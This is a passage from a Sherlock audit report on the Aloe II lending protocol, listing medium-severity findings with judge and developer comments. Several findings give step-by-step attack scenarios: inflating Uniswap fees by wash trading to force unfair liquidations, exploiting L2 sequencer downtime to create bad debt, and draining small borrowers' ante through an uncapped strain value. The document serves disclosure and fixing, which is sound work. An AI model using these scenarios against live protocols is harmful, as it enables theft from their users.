## Discussion

**sherlock-admin2**

1 comment(s) were left on this issue during the judging contest.

**MohammedRizwan** commented:
>  low severity



**haydenshively**

Bad debt socialization is an open problem in most (all?) DeFi lending protocols. We can try to solve it, but most likely that'll have to be in a future version.

# Issue M-3: Some values, such as `LIQUIDATION_INCENTIVE`, are fixed constants, while the volatility is variable and different between different pools and at different times, making it unprofitable for liquidators to liquidate in certain situations 

Source: https://github.com/sherlock-audit/2023-10-aloe-judging/issues/34 

## Found by 
panprog, roguereddwarf

Some of the protocol constants are fixed value constants for all markets at all times. However, since volatility is different in different markets and at different times, there might be situations when high volatility will make it unprofitable for liquidators to liquidate accounts, because the liquidation prices are lagging (as they're averages over somewhat long periods of times). The `LIQUIDATION_INCENTIVE`, for example, which is currently set to 20 (5%), might not be enough to compensate lagging liquidation prices in some cases. This will lead to accounts not being liquidated in time due to liquidations being unprofitable in some situations and large bad debt being generated in the protocol, which can cause bank run and loss of funds for the other protocol users.

Some of the constants which are fixed, but should depend on market/volatility:
- `LIQUIDATION_INCENTIVE`
- `UNISWAP_AVG_WINDOW`
- `LIQUIDATION_GRACE_PERIOD`
- `MAX_LEVERAGE`

## Vulnerability Detail

When account is liquidated and assets swap is required, the liquidator is required to swap account assets at current average pool price over the last `UNISWAP_AVG_WINDOW` (currently 30 minutes) time period plus bonus of the `LIQUIDATION_INCENTIVE` (currently 5%). Additionally, liquidator first has to warn the user and wait for `LIQUIDATION_GRACE_PERIOD` (currently 2 minutes) before liquidating.

The account health does depend on current volatility. However, once it's determined that the account is not healthy, the liquidation itself happens at that average price over the last 30 minutes, which can be unprofitable for liquidator for very long periods of time. For example, if any token price starts falling steadily for some reason (which has happened multiple times in the past), the average price over the last 30 minutes can stay 5%+ away from current price making liquidations unprofitable until the difference is less than 5% (`LIQUIDATION_INCENTIVE` is not enough to make it profitable for liquidator). Or some highly volatile token might often have periods of strong moves either up or down, causing average price to be more than 5% away from current price and making liquidations unprofitable.

Example scenario of user going into bad debt due to lack of liquidations (due to unprofitable liquidations):
1. Some token (TKN) starts falling from the price of $100 to $90
2. Current price is $90, average over the last 30 minutes is $95
3. Alice account (assets = 1.2 TKN, debt = 95 USDT) becomes unhealthy
4. Bob tries to liquidate Alice account, however in order to liquidate, he has to swap 1 TKN into 95 USDT (essentially buying 1 TKN for 95 USDT). His liquidation incentive for this is 5% or 95 * 5% = $4.75. This means he has to buy 1 TKN for $90.25, which is not profitable for Bob, so he doesn't liquidate.
5. The prices keeps falling steadily and all this time Alice account is unhealthy but it's not profitable for Bob to liquidate it.
6. Finally, the price stabilizes at $70. Alice assets are now worth $84, while the debt is $95, meaning Alice account is in bad debt. Bob liquidates it partially, swapping 1.2 TKN for 79.8 USDT, meaning Alice account is left with 0 assets and 15.2 USDT debt.

## Impact

Some pools/tokens can be highly volatile, or there might happen to be a period of high volatility, which will cause the difference between the liquidation price (average over `UNISWAP_AVG_WINDOW`) and the current price greater than `LIQUIDATION_INCENTIVE`, making it unprofitable for liquidators to liquidate unhealthy positions. This can cause large bad debt, which is a loss of funds for the other protocol users.

## Code Snippet

Constants being just fixed values, which will be the same for all markets and at all times, which is obviously wrong since different pools/tokens have different volatility and should have different values for these.
https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/libraries/constants/Constants.sol#L83-L92

## Tool used

Manual Review

## Recommendation

Consider moving the constants mentioned in this report to a market config rather than hard-coding them in the code. It might also be worth making some of them (like `LIQUIDATION_INCENTIVE`) depend on current volatility:
- `LIQUIDATION_INCENTIVE` - this is the most critical value, which shouldn't be the same across all markets
- `UNISWAP_AVG_WINDOW` - 30 minutes for averages can be too much for some highly volatile markets
- `LIQUIDATION_GRACE_PERIOD` - 2 minutes waiting time before starting liquidation can also be too much for some tokens
- `MAX_LEVERAGE` - max leverage for very volatile tokens should have much lower max leverage, than stable tokens like BTC/ETH, and stablecoins can have higher leverage.



## Discussion

**sherlock-admin2**

1 comment(s) were left on this issue during the judging contest.

**MohammedRizwan** commented:
>  valid



**haydenshively**

Duplicate #83 is valid, and portions of this are valid.

- `LIQUIDATION INCENTIVE` - report makes valid arguments; Medium severity is fair; we'll try to think of ways to address this without adding too much complexity. On the other hand, if users believe 5% to be insufficient, they can choose not to deposit to the pair of concern.
- `UNISWAP_AVG_WINDOW` - Yes, for some tokens in certain conditions, a 30 minute TWAP is too long. But going any shorter would open up the oracle to easier manipulation. It'll be up to users to decide whether the TWAP is suitable for a given pair -- if not, they simply don't depost.
- `LIQUIDATION_GRACE_PERIOD` - While there's no guarantee that 2 minutes is enough for liquidation, the IV-based health check is designed to give liquidators 24 hours. If things are moving so rapidly that they only have 2 minutes, something else has probably gone horribly wrong and there's not much we can do
- `MAX_LEVERAGE` - Only really impacts in-kind borrows and is designed to prevent interest accrual from making a `Borrower` unhealthy between blocks. Not relevant to the other points described here

# Issue M-4: governor can permanently prevent withdrawals in spite of being restricted 

Source: https://github.com/sherlock-audit/2023-10-aloe-judging/issues/35 

## Found by 
roguereddwarf
According to the Contest README (which is the highest order source of truth), the `governor` address should be restricted and not be able to prevent withdrawals from the `Lender`s.  

This doesn't hold true. By setting the interest rate that the borrowers have to pay to zero, the `governor` can effectively prevent withdrawals.  

## Vulnerability Detail
Quoting from the Contest README:  
```text
Is the admin/owner of the protocol/contracts TRUSTED or RESTRICTED?

Restricted. The governor address should not be able to steal funds or prevent users from withdrawing. It does have access to the govern methods in Factory, and it could trigger liquidations by increasing nSigma. We consider this an acceptable risk, and the governor itself will have a timelock.
```

The mechanism by which users are ensured that they can withdraw their funds is the interest rate which increases with utilization.  

Market forces will keep the utilization in balance such that when users want to withdraw their funds from the `Lender` contracts, the interest rate increases and `Borrower`s pay back their loans (or get liquidated).  

What the `governor` is allowed to do is to set a interest rate model via the [`Factory.governMarketConfig`](https://github.com/aloelabs/aloe-ii/blob/c71e7b0cfdec830b1f054486dfe9d58ce407c7a4/core/src/Factory.sol#L282-L303) function.  

The `SafeRateLib` is used to safely call the `RateModel` by e.g. handling the case when the call to the `RateModel` reverts and limiting the interest to a `MAX_RATE`: https://github.com/aloelabs/aloe-ii/blob/c71e7b0cfdec830b1f054486dfe9d58ce407c7a4/core/src/RateModel.sol#L38-L60.  

This clearly shows that the `governor` should be very much restricted in setting the `RateModel` such as to not damage users of the protocol which is in line with how the `governor` role is described in the README.  

However the interest rate can be set to zero even if the utilization is very high. If `Borrower`s can borrow funds for a zero interest rate, they will never pay back their loans. This means that users in the `Lender`s will never be able to withdraw their funds.  

It is also noteworthy that the timelock that the governor uses won't be able to prevent this scenario since even if users withdraw their funds as quickly as possible, there will probably not be enough time / availability of funds for everyone to withdraw in time (assuming a realistic timelock length).  

## Impact
The `governor` is able to permanently prevent withdrawals from the `Lender`s which it should not be able to do according to the contest README.  

## Code Snippet
Function to set the rate model:  
https://github.com/aloelabs/aloe-ii/blob/c71e7b0cfdec830b1f054486dfe9d58ce407c7a4/core/src/Factory.sol#L282-L303

`SafeRateLib` allows for a zero interest rate:  
https://github.com/aloelabs/aloe-ii/blob/c71e7b0cfdec830b1f054486dfe9d58ce407c7a4/core/src/RateModel.sol#L38-L60

## Tool used
Manual Review

## Recommendation
The `SafeRateLib` should ensure that as the utilization approaches `1e18` (100%), the interest rate cannot be below a certain minimum value.

This ensures that even if the `governor` behaves maliciously or uses a broken `RateModel`, `Borrower`s will never borrow all funds without paying them back.  



## Discussion

**sherlock-admin2**

2 comment(s) were left on this issue during the judging contest.

**panprog** commented:
> low, because even zero interest rates still enforce higher deposit than borrow, so there is still incentive for borrowers to return funds. 0 rate doesn't really lock the funds, just makes incentive to return them smaller, but I think it's still allowed according to protocol docs/rules, so is probably intended possibility.

**MohammedRizwan** commented:
>  invalid as governor actions are timelocked 



# Issue M-5: Uniswap Formula Drastically Underestimates Volatilty 

Source: https://github.com/sherlock-audit/2023-10-aloe-judging/issues/38 

## Found by 
Bandit

The implied volatility calculated fees over a time period divided by current liquidity will almost always be lower than a reasonable derivation of volaitility. This is because there is no incentive or way for rational market participants to "correct" a pool where there is too much liquidity relative to volatility and fees.

## Vulnerability Detail

Note: This report will use annualised IV expressed in % will be use, even though the code representation uses different scaling.

Aloe estimates implied volatility based on the article cited below (taken from in-line code comments)

```solidity

//@notice Estimates implied volatility using this math - https://lambert-guillaume.medium.com/on-chain-volatility-and-uniswap-v3-d031b98143d1).
```

Lambert's article describes a method of valuing Uniswap liquidity positions based on volatility. It is correct to say that the expected value of holding an LP position can be determined by the formula referenced in the article.  A liquidity position can be valued with the same as "selling a straddle" which is a short-volatility strategy which involves selling both a put and a call. Lambert does this by representing fee collection as an options premium and impermanat loss as the cost paid by the seller when the underlying hits the strike price. If the implied volatility of a uniswap position is above the fair IV, then it is profitable to be a liquidity provider, if it is lower, than it is not.

KEY POINT: However, this does not mean that re-arranging the formula to derive IV gives a correct estimation of IV.

The assumptions of the efficient market hypothesis holds true only when there is a mechanism and incentive for rational actors to arbitrage the value of positions to fair value. There is a direct mechanism to push down the IV of Uniswap liquidity positions - if the IV is too high then providing liquidity is +EV, so rational actors would deposit liquidity, and thus the IV as calculated by Aloe's formula will decrease.

However, when the `IV` derived from Uniswap fees and liquidity is too low, there is no mechanism for rational actors to profit off correcting this. If you are not already a liquidity provider, there is no way to provide "negative liquidity" or "short a liquidity position".

In fact the linked article by Lambert Guillaume contains data which demonstrates this exact fact - the table which shows the derived IV at time of writing having far lower results than the historical volatilities and the the IV derived from markets that allow both long and short trading (like options exchanges such as Deribit).  

Here is a quote from that exact article, which points out that the Uniswap derived IV is sometimes 2.5x lower. Also check out the table directly in the article for reference:

```solidity
"The realized volatility of most assets hover between 75% and 200% annualized in ETH terms. If we compare this to the IV extracted from the Uniswap v3 pools, we get:

Note that the volatilities are somewhat lower, perhaps a factor of ~2.5, for most assets."
```


The IV's in options markets or protocols that have long-short mechanisms such as Opyn's Squeeth have a correction mechanism for `IV's` which are too low, because you can both buy and sell options, and are therefore "correct" according to Efficient Market Hypothesis. The Uniswap pool is a "long-only" market, where liquidity can be added, but not shorted, which leads to systematically lower `IV` than is realistic. The EMH model, both in soft and hard form, only holds when there is a mechnaism for a rational minority to profit off correcting a market imbalance. If many irrational or utilitarian users deposits too much liquidity into a Uniswap v3 pool relative to the fee capture and IV, theres no way to profit off correcting this imbalance.

There are 3 ways to validate the claim that the Uniswap formula drastically underestimates the IV:

1. On chain data which shows that the liquidty and fee derivation from Uniswap gives far lower results than other
2. The table provided in Lambert Guillaume's article, which shows a Uniswap pool derived IVs which are far lower than the historical volatilities of the asset.
3. Studies showing that liquidity providers suffer far more impermanent loss than fees.

## Impact

- The lower IV increases LTV, which means far higher LTV for risky assets. `5 sigma` probability bad-debt events, as calculated by the protocol which is basically an impossibility, becomes possible/likely as the relationship between `IV` or `Pr(event)` is super-linear

## Code Snippet

https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/libraries/Volatility.sol#L33-L81

https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/VolatilityOracle.sol#L45-L94

## Tool used

Manual Review

## Recommendation

2 possible options (excuse the pun):

- Use historical price differences in the Uniswap pool (similar to a TWAP, but Time Weighted Average Price Difference) and use that to infer volatilty alongside the current implementations which is based on fees and liquidity. Both are inaccurate, but use the `maximum` of the two values. The 2 IV calculations can be used to "sanity check" the other, to correct one which drastically underestimates the risk

- Same as above, use the `maximum`  of the fee/liquidity derived `IV` but use a market that has long/short possibilities such as Opyn's Squeeth to sanity check the IV.



## Discussion

**sherlock-admin2**

2 comment(s) were left on this issue during the judging contest.

**panprog** commented:
> low, because the risk of liquidation has a huge margin of error built-in, so that 2.5 IV underestimation is not really a problems and is covered by the safety margin of the values used. Besides, all the other solutions are not very universal and do not guarantee much better IV estimation anyway.

**MohammedRizwan** commented:
>  seems intended design



**haydenshively**

This is **medium severity** because governance can increase `nSigma` from the default of 5 up to a maximum of 8. This 60% increase should be enough to compensate for systematic error arising from the not-quite-efficient market (and [Panoptic](https://panoptic.xyz/) should be available soon, making it more efficient).

That said, the whitehat is correct that the `VolatilityOracle` underestimates IV, and **we will do our best to improve it**. Unfortunately their first suggestion requires too much gas (at least for mainnet) and Opyn data would only work for a handful of markets. One idea is to allow IV to increase faster than it decreases -- in other words, use a different `IV_CHANGE_PER_UPDATE` constraint depending on whether IV is increasing or decreasing. You can see the impact of such a change in the plot below (compare "OG" vs "New"). It reduces avg error from -29% to -14%. Variations on this idea could get even better.

_T3 Index data [here](https://t3index.com/indexes/bit-vol/); `VolatilityOracle` simulated for a few weeks at the beginning of this year using mainnet USDC/WETH 0.05% pair_

<img width="592" alt="image" src="https://github.com/sherlock-audit/2023-10-aloe-judging/assets/17186559/25f35ef9-c3d0-47f8-b7b7-fc21b96583d7">

# Issue M-6: Uniswap Aggregated Fees Can be Increased at Close to Zero Cost 

Source: https://github.com/sherlock-audit/2023-10-aloe-judging/issues/45 

## Found by 
Bandit

The recorded fee collection in a Uniswap pool can be manipulated in the method described below while paying very little in "real" fees. This means that `IV` can be pushed upwards to unfairly liquidate pre-existing borrowers.

## Vulnerability Detail

In a sufficiently liquid pool and high trading volume, the potential attack profits you may get from swapping a large amount of tokens back and forth is likely lower than the profit an attacker can make from manipulating IV. This is especially true due to the `IV_CHANGE_PER_UPDATE` which limits of the amount that IV can be manipulated per update.

However, its possible to boost the recorded trading fees via trading fees while paying a very small cost relative to the fee increase amount.

The attack rests on 2 facts:

1. Aside from pools where the 2 pool assets are pegged to the same value, only a tiny portion of the total liquidity is in the "in-range" `tickSpacing`. 
2. In Uniswap, 100% of fees goes to the liquidity providers, in proportion to liquidity at the active tick, or ticks that gets passed through. This is different from other exchanges, where some portion of fees is distrubted to token holders, or the exchange operator.

Due to (1), a user with a large amount of capital can deposit all of it in the active tick and have >99% of the liquidity in the active tick. Due to (2), this also means that if they wash trade while keeping the price within that tick, they get >99% of the trading fees captured by their LP position. If $200K is deposited into that tick, then up to $200k can be traded, if the pool price starts exactly at the lower tick and ends at the upper tick, or vice versa. 

The wash trading can performed in one flashbots bundle, and since the trades are basically against the oneself, the trading profits-and-loss and impermanant gain/loss approximately cancel out.

Manipulating fees higher drives the `IV` higher, which in turn reduces the `LTV`. Let's say a position is not liquidatable yet, but a reduction in LTV will make that position liquidatable. There is profit incentive for an attacker to use the wash trading manipulation to decrease the LTV and then liquidate that position.

Note that this efficiency in wash trading to inflate fees is only possible in Uniswap v3. In v2 style pools, liquidity cannot be concentrated and it is impractical to deposit enough liquidity to capture the overwhelming majority of an entire pool. Most CLOB such as dYdX, IDEX etc have some fees that go to the protocol or token stakers (Uniswap 100% of "taker" fees go to LP's or "makers"), which means that even though a maker and taker order can be matched by wash traders, there is still significant fee externalisation to the protocol.

## Impact

- `IV` is cheaply and easily manipulated upwards, and thus `LTV` can be decreased, which can unfairly liquidate users

## Code Snippet

https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/libraries/Volatility.sol#L44-L81

## Tool used

Manual Review

## Recommendation

Using the MEDIAN fee of many short price intervals to calculate the Uniswap fees makes it more difficult to manipulate. The median, unlike mean (which is also implicitly used in the context a TWAP), is unaffected by large manipulations in a single block.






## Discussion

**sherlock-admin2**

2 comment(s) were left on this issue during the judging contest.

**panprog** commented:
> medium, because the volatility manipulation is still limited and not free, but possible to do to unfairly liquidate the accounts

**MohammedRizwan** commented:
>  valid



**haydenshively**

Manipulation is actually easier than that; an attacker can simply overpay in a flash swap and Uniswap will credit the overpayment directly to fee growth globals. The `IV_CHANGE_PER_UPDATE` constrains the impact of such an attack, making it quite expensive for limited payoff, especially considering the attacker doesn't know whether potential victims will respond to `Warn` or not. Medium for these reasons.

As for a fix, we could lower the constant to further constrain the attack. Since we're increasing the liquidation grace period in response to #73, borrowers should have more time to respond to unfair liquidations. And we could try to do the median feeGrowthGlobals thing as part of #91 improvements.

# Issue M-7: Lender.sol: Incorrect rewards accounting for RESERVE address in _transfer function 

Source: https://github.com/sherlock-audit/2023-10-aloe-judging/issues/49 

## Found by 
roguereddwarf
The `RESERVE` address is a special address in the `Lender` since it earns some of the interest that the `Lender` accrues.  

According to the contest README, which links to the [auditor quick start guide](https://docs.aloe.capital/aloe-ii/auditor-quick-start), the `RESERVE` address should behave normally, i.e. all accounting should be done correctly for it:  

```text
Special-cases related to the RESERVE address and couriers

We believe the RESERVE address can operate without restriction, i.e. it can call any function in the protocol without causing accounting errors. Where it needs to be limited, we believe it is. For example, Lender.deposit prevents it from having a courier. But are we missing anything? Many of our invariants in LenderHarness have special logic to account for the RESERVE address, and while we think everything is correct, we'd like to have more eyes on it.
```

The issue is that the [`Lender._transfer`](https://github.com/aloelabs/aloe-ii/blob/c71e7b0cfdec830b1f054486dfe9d58ce407c7a4/core/src/Lender.sol#L399-L425) function, which contains the logic for share transfers, does not accrue interest.  

Thereby the `RESERVE`'s share balance is not up-to-date and it loses out on any rewards that should be earned for the accrued balance.  

For all other addresses the reward accounting is performed correctly in the `Lender._transfer` function and according to the auditor quick start guide it is required that the same is true for the `RESERVE` address.  


## Vulnerability Detail
When interest is accrued, the `RESERVE` address [gets minted shares](https://github.com/aloelabs/aloe-ii/blob/c71e7b0cfdec830b1f054486dfe9d58ce407c7a4/core/src/Lender.sol#L536-L547).  

However the `Lender._transfer` function does not accrue interest and so `RESERVE`'s balance is not up to date which means the `Rewards.updateUserState` call operates on an [incorrect balance](https://github.com/aloelabs/aloe-ii/blob/c71e7b0cfdec830b1f054486dfe9d58ce407c7a4/core/src/Lender.sol#L411-L421).  

The balance of `RESERVE` is too low which results in a loss of rewards.  

## Impact
As described above, the `RESERVE` address should have its reward accounting done correctly just like all other addresses.  

Failing to do so means that the `RESERVE` misses out on some rewards because `Lender._transfer` does not update the share balance correctly and so the rewards will be accrued on a balance that is too low.

## Code Snippet
https://github.com/aloelabs/aloe-ii/blob/c71e7b0cfdec830b1f054486dfe9d58ce407c7a4/core/src/Lender.sol#L399-L425

## Tool used
Manual Review

## Recommendation
The `RESERVE` address should be special-cased in the `Lender._transfer` function. Thereby gas is saved when transfers are executed that do not involve the `RESERVE` address and the reward accounting is done correctly for when the `RESERVE` address is involved.  

When the `RESERVE` address is involved, `(Cache memory cache, ) = _load();` and `_save(cache, /* didChangeBorrowBase: */ false);` must be called. Also the Rewards state must be updated with this call: `Rewards.updatePoolState(s, a, newTotalSupply);`.  



## Discussion

**sherlock-admin2**

2 comment(s) were left on this issue during the judging contest.

**panprog** commented:
> low, because the reward amount lost is very small and can be worked around by manually accuringInterest before transferring

**MohammedRizwan** commented:
>  valid



# Issue M-8: No handling of L2 sequencer down situation, which can lead to intentional bad debt creation and other malicious actions while sequencer is down or just after it becomes active again 

Source: https://github.com/sherlock-audit/2023-10-aloe-judging/issues/55 

## Found by 
panprog

The protocol lists L2 networks (Arbitrum, Optimism and Base) as deployment chains. These L2 chains depend on sequencer for most of its functionality. When the sequencer is down for whatever reason, it's still possible to communicate with L2 networks via L1 contracts, but it's very inconvenient and only a few users really use it, meaning that it's unfair to let the protocol keep working as usual when sequencer is down as few users can cause damage to many users during this time (liquidators won't be active etc.). The protocol behavior upon sequencer going back online after a long downtime can also cause all kinds of problems, so it's advised to add grace period when L2 sequencer goes back online

There is functionality to pause some actions if pool manipulation is detected. But there is no functionality to also pause some actions if L2 sequencer is down or when it just came back online.

## Vulnerability Detail

More detailed explanation about the details of L2 networks downtime and how to handle it can be read here:
https://docs.chain.link/data-feeds/l2-sequencer-feeds

The following scenario can happen when L2 sequencer goes down:
1. ETH price = 1000 USDT
2. L2 sequencer goes down for several hours
3. At the time L2 sequencer goes online again, ETH price = 900 USDT
4. Once it comes back up online, uniswap pair average price is still 1000 USDT (and the last uniswap pair price is 1000 USDT a few hours ago, meaning volatility is 0 and average price will slowly go down from 1000 to 900 over 30 minutes)
5. Malicious user can then borrow 1000 USDT and put 1.005 ETH as collateral, effectively selling ETH for 995 USDT, which is way above the current ETH price. Position will be healthy if 1.005 ETH is added to this account as uniswap position with the range [994..1000], it will then be treated as 1005 USDT for health check (since uniswap position will be taken at average price of 1000 instead of current 900).
6. Later, when the average price goes down to 900 USDT, user's account will be liquidated for a bad debt of 100 USDT, causing loss of funds for the other protocol users.

There are also a lot of the other issues possible right after sequencer goes online. For example, it will be unprofitable for liquidators to liquidate accounts if they involve assets swap - liquidator will be forced to buy ETH for 1000 USDT instead of current price of 900 USDT, so liquidations mostly won't work during that time, leaving many unhealthy positions unliquidated.

The same scenario can also be slightly modified to borrow before the sequencer goes offline via direct L1 contract communication. Such user's transaction will be added to queue and will be added to L2 blockchain while sequencer is still offline. There might be even more severe scenarios when user acts via L1 while the sequencer is down.

## Impact

If L2 sequencer goes offline for some time, malicious users can cause all kinds of problems during offline time and in the first minutes after sequencer goes back online (since the price will jump from the last time it is online, but the average price will not catch up until `AVG_WINDOW` time passes). These malicious actions will usually lead to creation of bad debt via different means.

There will also be non-malicious user problems, such as liquidators refusing to liquidate due to unprofitable asset swaps required for liquidaiton.

## Code Snippet

There is a `pause` functionality, but it only allows to pause if pool manipulation is detected:
https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Factory.sol#L157-L164

But there is no protection of the protocol while L2 sequencer is down or just came back online.

## Tool used

Manual Review

## Recommendation

Consider disabling all borrower actions (liquidate, warn, modify) while sequencer is down. Additionally, disable liquidations and withdrawals in the first AVG_WINDOW seconds after sequencer came back online. Sequencer status and time since last status change can be checked in chainlink examples:
https://docs.chain.link/data-feeds/l2-sequencer-feeds



## Discussion

**sherlock-admin2**

1 comment(s) were left on this issue during the judging contest.

**MohammedRizwan** commented:
>  low severity



# Issue M-9: Courier can be cheated to avoid fees 

Source: https://github.com/sherlock-audit/2023-10-aloe-judging/issues/61 

## Found by 
roguereddwarf, rvierdiiev
User can avoid paying fees to courier by providing his address.
## Vulnerability Detail
Courier is the entity that will get some percentage of user's profit, when user withdraws shares. Why someone will be providing fees to that courier? Because courier can provide very comfortable website for user, so he is pleased to pay for that service.

In case if any frontend will deposit on behalf of user, then they should have [at least 1 wei allowance from user](https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Lender.sol#L121). In this case they have ability [to set themselves as courier for user](https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Lender.sol#L140C83-L140C92).

Courier is set inside `_mint` function. There is one important thing: in case if user already has shares, [then courier will not be set](https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Lender.sol#L453-L456), which means that whoever did that deposit, he will not receive any fees in the end.

So how user can use this? The most simple way is to frontrun deposit call and transfer some amount of shares to his account from another account. As result, his shares amount will not be 0 anymore and fees will be avoid.

Another problem is that when user has used one website and then switched to another one, then new service expects that user will pay fees for using it, but in reality after  new deposit, only old frontend will receive all fees.
## Impact
User can cheat couriers.
## Code Snippet
Provided above
## Tool used

Manual Review

## Recommendation
I guess that deposit function should check if provided courier will be set or not and early revert if not.



## Discussion

**sherlock-admin2**

2 comment(s) were left on this issue during the judging contest.

**panprog** commented:
> borderline low/medium, it's indeed possible to deposit 1 wei frontrunning deposit with courier, but there is no profit in it for the attacker, dup of #37

**MohammedRizwan** commented:
>  invalid issue



**haydenshively**

Probability of exploit is low, but we'll try to improve the courier flows referenced here and in #37, #39, #80, etc.

# Issue M-10: Liquidation process is flawed. missing incentive to call warn 

Source: https://github.com/sherlock-audit/2023-10-aloe-judging/issues/145 

## Found by 
0xReiAyanami

Aloe´s Liquidation process s flawed in the way, that there is no incentive for Liquidators to call the warn function, which is required before liquidations. 

## Vulnerability Detail

The Aloe protocol has a Liquidation process, which involves a grace period for the Borrower.
This means, there is a `warn` function, that has to be called, that is setting a `unleashLiquidationTime`. A Liquidation can only be executed when this time is reached.

Problem is, there is no incentive for anyone to call the `warn` function. Only the actual `liquidate` function is inventiviced by giving a 5% incentive in Tokens, if there is a swap required, and always giving a small amount of ETH (ANTE) to cover the gas cost.

A Liquidator that calls the warn function has no guarantee, that he is the one, that actually can call liquidate, when the time has come. Therefore it would be a waste of Gas to call the warn function.

This might result in a situation where nobody is willing to call `warn`, and therefore the borrower will not get liquidated at all, which could ultimately lead to a loss of Funds for the Lender, when the Borrower starts to accrue bad Debt. 

## Impact

- No incentive to call `warn` --> Borrower will not get liquidated
- Loss of funds for Lender, because Borrower might accrue bad debt


## Code Snippet

https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Borrower.sol#L148-L173

## Tool used

Manual Review

## Recommendation

Incentivice the call of warn, to at least pay a small amount of eth (similiar to the ANTE), to ensure liquidation is going to happen.






## Discussion

**sherlock-admin2**

3 comment(s) were left on this issue during the judging contest.

**panprog** commented:
> borderline low/medium, but indeed there is no incentive for anyone to call warn

**MohammedRizwan** commented:
>  valid

**chrisling** commented:
>  the best incentive in this case is that liquidators can liquidate after they call warn. The recommendation will only introduce a lot more issues (e.g. malicious actors exploiting the incentive by spamming warn)



# Issue M-11: The whole ante balance of a user with a very small loan, who is up for liquidation can be stolen without repaying the debt 

Source: https://github.com/sherlock-audit/2023-10-aloe-judging/issues/146 

## Found by 
OxZ00mer

Users with very small loans on markets with tokens having very low decimals are vulnerable to having their collateral stolen during liquidation due to precision loss.

## Vulnerability Detail

Users face liquidation risk when their Borrower contract's collateral falls short of covering their loan. The `strain` parameter in the liquidation process enables liquidators to partially repay an unhealthy loan. Using a `strain` smaller than 1 results in the liquidator receiving a fraction of the user's collateral based on `collateral / strain`.

The problem arises from the fact that the `strain` value is not capped, allowing for a potentially harmful scenario. For instance, a user with an unhealthy loan worth $0.30 in a WBTC (8-decimal token) vault on Arbitrum (with very low gas costs) has $50 worth of ETH (with a price of $1500) as collateral in their Borrower contract. A malicious liquidator spots the unhealthy loan and submits a liquidation transaction with a `strain` value of 1e3 + 1. Since the strain exceeds the loan value, the liquidator's repayment amount gets rounded down to 0, effectively allowing them to claim the collateral with only the cost of gas.

```solidity
assembly ("memory-safe") {
	// ...
	liabilities0 := div(liabilities0, strain) // @audit rounds down to 0 <-
	liabilities1 := div(liabilities1, strain) // @audit rounds down to 0 <-
	// ...
}
```

Following this, the execution bypasses the `shouldSwap` if-case and proceeds directly to the following lines:

```solidity
// @audit Won't be repaid in full since the loan is insolvent
_repay(repayable0, repayable1);
slot0 = (slot0_ & SLOT0_MASK_POSITIONS) | SLOT0_DIRT;

// @audit will transfer the user 2e14 (0.5$)
payable(callee).transfer(address(this).balance / strain);
emit Liquidate(repayable0, repayable1, incentive1, priceX128);

```

Given the low gas price on Arbitrum, this transaction becomes profitable for the malicious liquidator, who can repeat it to drain the user's collateral without repaying the loan. This not only depletes the user's collateral but also leaves a small amount of bad debt on the market, potentially causing accounting issues for the vaults.

## Impact

Users with small loans face the theft of their collateral without the bad debt being covered, leading to financial losses for the user. Additionally, this results in a potential amount of bad debt that can disrupt the vault's accounting.

## Code Snippet

https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Borrower.sol#L194

https://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Borrower.sol#L283

## Tool used

Manual Review

## Recommendation

Consider implementing a check to determine whether the repayment impact is zero or not before transferring ETH to such liquidators.

```solidity
require(repayable0 != 0 || repayable1 != 0, "Zero repayment impact.") // @audit <-
_repay(repayable0, repayable1);

slot0 = (slot0_ & SLOT0_MASK_POSITIONS) | SLOT0_DIRT;

payable(callee).transfer(address(this).balance / strain);
emit Liquidate(repayable0, repayable1, incentive1, priceX128);

```

Additionally, contemplate setting a cap for the `strain` and potentially denoting it in basis points (BPS) instead of a fraction. This allows for more flexibility when users intend to repay a percentage lower than 100% but higher than 50% (e.g., 60%, 75%, etc.).



## Discussion

**sherlock-admin2**

2 comment(s) were left on this issue during the judging contest.

**panprog** commented:
> low, because it's more profitable to just straight liquidate fully, besides the loss per transaction will be very small

**MohammedRizwan** commented:
>  valid



